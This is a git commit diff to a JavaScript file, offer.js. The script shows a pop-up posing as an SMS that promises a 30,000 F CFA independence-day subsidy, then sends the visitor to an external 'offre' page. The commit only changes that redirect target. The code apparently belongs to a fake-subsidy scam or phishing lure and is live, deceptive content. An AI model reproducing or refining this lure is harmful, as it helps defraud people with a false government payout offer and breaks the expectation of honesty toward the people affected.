62f7ae83fc58db0c04523f2ecda12847d4df59c8
realmankeny <realmankeny@gmail.com>
2025-03-31 03:49:40 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,5 @@
 var password = '30,000F.CFA'
 password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir une subvention de 30,000F.CFA à loccasion de la fête de lindépendance, Veuillez appuyer sur OK pour CONTINUER ','30,000F.CFA');
 if (password != '30,000F.CFA') {
-location.href='https://independence.goprogram.xyz/page1';
+location.href='https://independence.goprogram.xyz/offre';
 }
